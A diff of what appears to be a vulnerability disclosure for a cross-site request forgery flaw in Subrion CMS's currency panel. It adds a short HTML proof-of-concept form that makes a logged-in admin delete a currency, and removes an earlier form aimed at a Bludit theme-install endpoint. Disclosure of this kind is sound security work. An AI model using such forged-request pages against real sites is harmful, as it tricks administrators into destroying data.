@@ -8,9 +8,15 @@
 3:As Default 3 Currencies are added in the Site you can view it by navigaing to http://localhost/huntr/subrion/panel/currencies/   
 4:Save the below code as HTML and Click Submit . The Currencie will be deleted    
 ```
-<form method="GET" action="http://localhost/bludit-master/admin/install-theme/alternative">
-<input type="submit" >
-</form>
+html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://localhost/subrion/panel/currencies/delete/EUR/">
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
 ```
 # Impact
 This can allow a user to force admin to remove "Currencies" from the website
